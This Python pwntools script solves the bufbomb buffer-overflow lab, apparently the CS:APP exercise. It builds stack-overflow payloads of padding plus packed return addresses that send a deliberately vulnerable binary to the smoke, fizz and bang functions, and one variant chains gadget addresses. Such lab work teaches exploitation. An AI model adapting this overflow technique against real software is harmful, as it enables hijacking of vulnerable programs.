#########################PART 1############################
from pwn import *
context.log_level="debug"
import sys
reload(sys)
sys.setdefaultencoding('utf8')
#########################PART 2############################
argt="-u toka"
p=process(argv=['./bufbomb', argt,'-n'])

smoke=0x08048C18
fizz=0x08048C42
bang=0x08048C9D

p.recvuntil("Cookie:")
cookie=int(p.recv(11),16)
print(hex(cookie))
#########################task 1############################
'''
payload1='a'*44+p32(smoke)
p.sendline(payload1)
'''
#########################task 2############################
'''
payload2='a'*44+p32(fizz)+p32(cookie)+p32(cookie)
p.sendline(payload2)
'''
#########################task 3############################
'''
call_gets=0x08049200
global_value=0x0804D100
payload3='a'*40+p32(0x55683678)+p32(call_gets)+p32(global_value)+p32(bang)
p.sendline(payload3)
p.sendline(p32(cookie))
'''
#########################task 4############################
'''
pop_ebx=0x08048806
ebx2eax=0x0804a1bf
retaddr=0x8048DC0
old_ebp=0x556836a0
old_esp=0x55683678
payload4='a'*40+p32(old_ebp)+p32(pop_ebx)+p32(cookie)+p32(retaddr)
p.sendline(payload4)
'''
#########################task 4############################

pop_ebx=0x08048806
ebx2eax=0x0804a1bf
retaddr=0x8048DC0
old_ebp=0x556836a0
old_esp=0x55683678
leave_ret=0x08048aa8
ret=0x0804833c
call_esp=0x0804aa8b
payload4='a'*520+p32(old_ebp)+p32(pop_ebx)+p32(cookie)+p32(retaddr)
p.sendline(payload4)


p.interactive()
